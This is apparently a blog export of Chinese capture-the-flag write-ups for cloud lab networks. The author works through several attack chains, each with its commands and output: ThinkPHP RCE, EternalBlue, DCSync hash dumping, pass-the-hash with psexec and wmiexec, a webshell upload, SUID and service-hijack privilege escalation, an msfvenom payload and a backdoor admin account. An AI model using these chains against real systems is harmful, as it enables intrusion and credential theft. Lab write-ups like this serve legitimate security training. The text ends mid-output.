webtitle[2025-04-18 08:00:55] [SUCCESS] 网站标题 http://39.99.232.66 状态码:200 长度:5578 标题:Bootstrap Material Admin[2025-04-18 08:00:57] [SUCCESS] 目标: http://39.99.232.66:80 漏洞类型: poc-yaml-thinkphp5023-method-rce 漏洞名称: poc1 详细信息: links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce[2025-04-18 08:01:01] [SUCCESS] 扫描已完成: 3/3 80端口存在thinkphp的漏洞，直接工具一把梭了，拿到shell后提一下权,sudo可以无密码执行mysql，mysql提权 12345(www-data:/) $ sudo -lMatching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql 1sudo mysql -e &#x27;\\! cat /root/flag/flag01.txt&#x27; 拿到了flag的第一部分 FLAG2&amp;&amp;FLAG3写一个公钥进去，然后ssh登录，上传fscan再做一个代理 12345678910111213(www-data:/tmp) $ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:25:0c:72 brd ff:ff:ff:ff:ff:ff inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359017sec preferred_lft 315359017sec inet6 fe80::216:3eff:fe25:c72/64 scope link valid_lft forever preferred_lft forever 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788root@ubuntu-web01:~# ./fscan -h 172.22.1.15/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-18 20:14:45] [INFO] 暴力破解线程数: 1[2025-04-18 20:14:45] [INFO] 开始信息扫描[2025-04-18 20:14:45] [INFO] CIDR范围: 172.22.1.0-172.22.1.255[2025-04-18 20:14:45] [INFO] 生成IP范围: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)[2025-04-18 20:14:45] [INFO] 解析CIDR 172.22.1.15/24 -&gt; IP范围 172.22.1.0-172.22.1.255[2025-04-18 20:14:45] [INFO] 最终有效主机数量: 256[2025-04-18 20:14:45] [INFO] 开始主机扫描[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.15 存活 (ICMP)[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.21 存活 (ICMP)[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.2 存活 (ICMP)[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.18 存活 (ICMP)[2025-04-18 20:14:48] [INFO] 存活主机数量: 4[2025-04-18 20:14:48] [INFO] 有效端口数量: 233[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:88[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:80[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:80[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:22[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:445[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:445[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:445[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:389[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:139[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:139[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:139[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:135[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:135[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:135[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:3306[2025-04-18 20:14:49] [SUCCESS] 服务识别 172.22.1.15:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.18:3306 =&gt; [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server][2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.2:88 =&gt;[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:445 =&gt;[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:445 =&gt;[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:445 =&gt;[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:139 =&gt; Banner:[.][2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:139 =&gt; Banner:[.][2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:139 =&gt; Banner:[.][2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:80 =&gt; [http][2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.15:80 =&gt; [http][2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.18:135 =&gt;[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.2:135 =&gt;[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.21:135 =&gt;[2025-04-18 20:15:54] [INFO] 存活端口数量: 15[2025-04-18 20:15:54] [INFO] 开始漏洞扫描[2025-04-18 20:15:54] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.1.21主机名: XIAORANG-WIN7发现的网络接口: IPv4地址: └─ 172.22.1.21[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.1.2主机名: DC01发现的网络接口: IPv4地址: └─ 172.22.1.2[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.1.18主机名: XIAORANG-OA01发现的网络接口: IPv4地址: └─ 172.22.1.18[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.15 状态码:200 长度:5578 标题:Bootstrap Material Admin[2025-04-18 20:15:54] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393][2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.2 DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1[2025-04-18 20:15:54] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.18 状态码:302 长度:0 标题:无标题 重定向地址: http://172.22.1.18?m=login[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600[2025-04-18 20:15:55] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012 标题:信呼协同办公系统[2025-04-18 20:15:55] [SUCCESS] 目标: http://172.22.1.15:80 漏洞类型: poc-yaml-thinkphp5023-method-rce 漏洞名称: poc1 详细信息: links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce 172.22.1.21 有永恒之蓝，上msf梭哈 12345proxychains4 msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21exploit 收集一些域内哈希 1234567891011121314meterpreter &gt; load kiwimeterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;[rpc] Service : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 5141106 Marcus e07510a4284b3c97c8e7dee970918c5c 5121107 Charles f6a9881cd5ae709abb4ac9ab87f24617 5121000 DC01$ 09bb349ab17bbe480b91eb20bb204bee 532480500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 5121104 XIAORANG-OA01$ 25e4b9f501c8831b0568fcc61e4ddc7f 40961108 XIAORANG-WIN7$ acf1bc550440e81c9f2663ff304b4ab3 4096 有域控的哈希了直接打域控，然后就可以为所欲为了 123┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-psexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.2 -codec gbkC:\\Users\\Administrator\\flag&gt; type flag03.txt 123┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-psexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.18 -codec gbkC:\\Users\\Administrator\\flag&gt; type flag02.txt 看别人的wp，好像是要先打172.22.1.18，是一个OA系统可以打nday一把梭，我就不看了","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Delegation","slug":"春秋云镜-Delegation","date":"2025-04-18T02:26:30.000Z","updated":"2025-04-19T13:27:13.529Z","comments":true,"path":"2025/04/18/春秋云镜-Delegation/","permalink":"https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/","excerpt":"","text":"FLAG1首先对靶机进行信息搜集 12345678910111213141516171819202122232425262728┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.99.130.13┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-17 22:29:55] [INFO] 暴力破解线程数: 1[2025-04-17 22:29:55] [INFO] 开始信息扫描[2025-04-17 22:29:55] [INFO] 最终有效主机数量: 1[2025-04-17 22:29:55] [INFO] 开始主机扫描[2025-04-17 22:29:55] [INFO] 有效端口数量: 233[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:22[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:21[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:3306[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:80[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).][2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:80 =&gt; [http][2025-04-17 22:30:04] [INFO] 存活端口数量: 4[2025-04-17 22:30:04] [INFO] 开始漏洞扫描[2025-04-17 22:30:04] [INFO] 加载的插件: ftp, mysql, ssh, webpoc, webtitle[2025-04-17 22:30:05] [SUCCESS] 网站标题 http://39.99.130.13 状态码:200 长度:68104 标题:中文网页标题 80端口是cmseasy,url后面拼接/admin版本号是v7752,在网上可以查到漏洞 https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/ 都需要登录后台，弱口令admin:123456登录成功了 发包然后去访问1.php可以发现写入成功了，写个一句话木马，然后蚁剑连接 flag在/home/flag/下，但是只有root能查看，反弹一个shell准备提权 1234567891011121314151617181920www-data@localhost:/var/www/html$ find / -perm -u=s 2&gt;/dev/nullfind / -perm -u=s 2&gt;/dev/null/usr/bin/stapbpf/usr/bin/gpasswd/usr/bin/chfn/usr/bin/su/usr/bin/chsh/usr/bin/staprun/usr/bin/at/usr/bin/diff/usr/bin/fusermount/usr/bin/sudo/usr/bin/mount/usr/bin/newgrp/usr/bin/umount/usr/bin/passwd/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device 可以看到diff具有suid权限，可以读取flag01.txt FLAG2还给了一个hint 123Great job!!!!!!Here is the hint: WIN19\\AdrianI&#x27;ll do whatever I can to rock you... 上传一个fscan先扫，然后做一个代理隧道 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687www-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24./fscan -h 172.22.4.36/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-18 11:04:32] [INFO] 暴力破解线程数: 1[2025-04-18 11:04:32] [INFO] 开始信息扫描[2025-04-18 11:04:32] [INFO] CIDR范围: 172.22.4.0-172.22.4.255[2025-04-18 11:04:32] [INFO] 生成IP范围: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)[2025-04-18 11:04:32] [INFO] 解析CIDR 172.22.4.36/24 -&gt; IP范围 172.22.4.0-172.22.4.255[2025-04-18 11:04:33] [INFO] 最终有效主机数量: 256[2025-04-18 11:04:33] [INFO] 开始主机扫描[2025-04-18 11:04:33] [INFO] 正在尝试无监听ICMP探测...[2025-04-18 11:04:33] [INFO] 当前用户权限不足,无法发送ICMP包[2025-04-18 11:04:33] [INFO] 切换为PING方式探测...[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.7 存活 (ICMP)[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.36 存活 (ICMP)[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.45 存活 (ICMP)[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.19 存活 (ICMP)[2025-04-18 11:04:39] [INFO] 存活主机数量: 4[2025-04-18 11:04:39] [INFO] 有效端口数量: 233[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:80[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:80[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:135[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:139[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:135[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:139[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:135[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:139[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:389[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:445[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:22[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:21[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:445[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:445[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:88[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:3306[2025-04-18 11:04:39] [SUCCESS] 服务识别 172.22.4.36:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).][2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \\&gt;; caching_sha2_password][2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:80 =&gt; [http][2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:139 =&gt; Banner:[.][2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:139 =&gt; Banner:[.][2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.19:139 =&gt; Banner:[.][2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:445 =&gt; [2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.19:445 =&gt; [2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.45:445 =&gt; [2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.7:88 =&gt; [2025-04-18 11:04:48] [SUCCESS] 服务识别 172.22.4.36:80 =&gt; [http][2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.7:135 =&gt; [2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.19:135 =&gt; [2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.45:135 =&gt; [2025-04-18 11:05:44] [INFO] 存活端口数量: 16[2025-04-18 11:05:44] [INFO] 开始漏洞扫描[2025-04-18 11:05:44] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-18 11:05:44] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.4.45主机名: WIN19发现的网络接口: IPv4地址: └─ 172.22.4.45[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45 XIAORANG\\WIN19 [2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.45 状态码:200 长度:703 标题:IIS Windows Server[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.4.7主机名: DC01发现的网络接口: IPv4地址: └─ 172.22.4.7[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.4.19主机名: FILESERVER发现的网络接口: IPv4地址: └─ 172.22.4.19[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7 DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19 FILESERVER.xiaorang.lab Windows Server 2016 Standard 14393[2025-04-18 11:05:45] [INFO] 系统信息 172.22.4.7 [Windows Server 2016 Datacenter 14393][2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.36 状态码:200 长度:68100 标题:中文网页标题 上面的flag1给了个提示在WIN19那台机器上存在一个Adrian用户，密码在rockyou里 1SMB 172.22.4.45 445 WIN19 [-] WIN19\\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED 还是得眼尖一点，密码过期他不会告诉你，rdp登录修改密码 1rdesktop 172.22.4.45 桌面上有一个PrivescCheck文件夹，PrivescCheck是一个提权的工具，他跑完了留下一个html文件，直接访问就行 给了两个high，第一个WSUS 更多的是被利用来横向移动,第二个注册表，用户对gpupdate具有写、启动、停止的的权限 用msf生成一个正向的木马 123456msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exeuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset LPORT 9999set RHOST 172.22.4.45run 将马上传上去然后修改一下注册表手动启动服务 1sc start gupdate 但是这个shell很快就会断开，所以要迁移到另一个进程中 12psmigrate PID 不知道为什么我的msf shell启动不起来，导出hash 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859load kiwicreds_allmeterpreter &gt; creds_all[+] Running as SYSTEM[*] Retrieving all credentialsmsv credentials===============Username Domain NTLM SHA1-------- ------ ---- ----Adrian WIN19 4ba5d16eb261eb61148ab5264f457cbb 9a712bd84b09123d36da74d9d5ac255c027588ebWIN19$ XIAORANG d41fef724adf6f2ed2cbb5a4ebd186c9 af156e5c6afc93b1a648040bd59f7d5cab23d81aWIN19$ XIAORANG 5943c35371c96f19bda7b8e67d041727 5a4dc280e89974fdec8cf1b2b76399d26f39b8f8wdigest credentials===================Username Domain Password-------- ------ --------(null) (null) (null)Adrian WIN19 (null)WIN19$ XIAORANG (null)kerberos credentials====================Username Domain Password-------- ------ --------(null) (null) (null)Adrian WIN19 (null)WIN19$ xiaorang.lab ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25 75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4 5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16 9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a 75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6 1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5 c 57 a8WIN19$ xiaorang.lab 3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d 90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5 9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90 0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5 3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f 8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e 1 d0 1fwin19$ XIAORANG.LAB ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25 75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4 5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16 9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a 75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6 1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5 c 57 a8 hashdump 12345Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::Adrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e::: 用Administrator登录 123┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45C:\\&gt;type C:\\Users\\Administrator\\flag\\flag02.txt FLAG3&amp;FLAG4添加一个新用户 12net user lv Asd123132 /addnet localgroup administrators lv /add 查看域内委派关系 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071C:\\Users\\lv\\Desktop&gt;Adinfo_win.exe -d=&quot;xiaorang.lab&quot; --dc=&quot;172.22.4.7&quot; -u=&quot;WIN19$&quot; -H=&quot;d41fef724adf6f2ed2cbb5a4ebd186c9&quot; _____ _ __ /\\ | __ \\(_) / _| / \\ | | | |_ _ __ | |_ ___ / /\\ \\ | | | | | &#x27;_ \\| _/ _ \\ Tools that collect information from domain / ____ \\| |__| | | | | | || (_) | /_/ \\_\\_____/|_|_| |_|_| \\___/ v1.5 by lzz[i] Try to connect &#x27;172.22.4.7&#x27;[c] Auth Domain: xiaorang.lab[c] Auth user: WIN19$[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9[c] connected successfully,try to dump domain info[i] DomainVersion found! [+] Windows 2016 Server operating system[i] Domain SID: [+] S-1-5-21-1913786442-1328635469-1954894845[i] Domain MAQ found [+] 10[i] Domain Account Policy found [+] pwdHistory: 24 [+] minPwdLength: 7 [+] minPwdAge: 1(day) [+] maxPwdAge: 42(day) [+] lockoutThreshold: 0 [+] lockoutDuration: 30(min)[i] Domain Controllers: 1 found [+] DC01$ ==&gt;&gt;&gt; Windows Server 2016 Datacenter [10.0 (14393)] ==&gt;&gt;&gt; 172.22.4.7[i] ADCS has not found![i] Domain Exchange Server: 0 found[i] Domain All DNS: [+] Domain Dns 3 found,Saved in All_DNS.csv[i] Domain Trusts: 0 found[i] SPN: 39 found[i] Domain GPOs: 2 found[i] Domain Admins: 1 users found [+]Administrator[i] Enterprise Admins: 1 users found [+]Administrator[i] administrators: 1 users found [+]Administrator[i] Backup Operators: 0 users found[i] Users: 6 found[i] User with Mail: 0 found[i] Only_name_and_Useful_Users: 3 found[i] Only_admincount=1_andUseful_Users: 1 found[i] Locked Users: 0 found[i] Disabled Users: 3 found[i] Users with passwords not set to expire: 2 found[i] Domain Computers: 5 found[i] Only_name_and_Useful_computers: 5 found[i] Groups: 49 found[i] Domain OUs: 1 found[i] LAPS Not found[i] LAPS passwords: 0 found[i] SensitiveDelegate Users: 0 found[i] AsReproast Users: 0 found[i] Kerberoast Users: 1 found [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab ==&gt;&gt;&gt; kadmin/changepw[i] SIDHistory Users: 0 found[i] CreatorSID Users: 2 found [+] WIN-3X7U15C2XDM$ ==&gt;&gt;&gt; Marcus [+] WIN-YUUAW2QG9MF$ ==&gt;&gt;&gt; Marcus[i] RBCD Users: 0 found[i] Unconstrained Deligation Users: 1 found [+] WIN19$[i] Constrained Deligation Users: 0 found[i] Krbtgt password last set 